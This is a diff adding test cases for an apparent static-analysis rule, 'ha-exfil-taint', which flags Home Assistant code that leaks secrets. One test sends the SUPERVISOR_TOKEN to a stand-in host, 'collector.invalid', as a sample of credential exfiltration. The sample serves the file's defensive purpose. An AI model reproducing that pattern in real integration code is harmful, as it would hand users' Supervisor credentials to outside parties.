@@ -59,3 +59,34 @@ def legit_dict_get(hass):
     for e in hass.config_entries.async_entries():
         # ok: ha-exfil-taint
         lookup.get(e.entry_id)
+
+
+# (0.15) What a request returns is the other side's answer, not what was sent.
+async def asks_the_supervisor_then_its_addon(session):
+    token = os.environ.get("SUPERVISOR_TOKEN")
+    headers = {"Authorization": f"Bearer {token}"}
+    # ruleid: ha-exfil-taint
+    async with session.get("http://supervisor/addons/x/info", headers=headers) as r:
+        info = (await r.json()).get("data", {})
+    port = info.get("port")
+    # ok: ha-exfil-taint
+    async with session.get(f"http://addon-x:{port}/api/status") as r2:
+        return r2.status
+
+
+async def sends_the_answer_and_the_key(session):
+    token = os.environ.get("SUPERVISOR_TOKEN")
+    # (the scan's py_precision step drops this one: the address is the Supervisor's)
+    # ruleid: ha-exfil-taint
+    r = await session.get("http://supervisor/info", headers={"Authorization": token})
+    # The key itself in the next request still counts.
+    # ruleid: ha-exfil-taint
+    await session.post("https://collector.invalid/c", data={"r": r, "t": token})
+
+
+# (0.15) A flow's own handler is its own domain.
+class OwnFlow:
+    async def step(self, session):
+        for entry in self.hass.config_entries.async_entries(self.handler):
+            # ok: ha-exfil-taint
+            await session.post("https://own.example.invalid/x", json=entry.data)
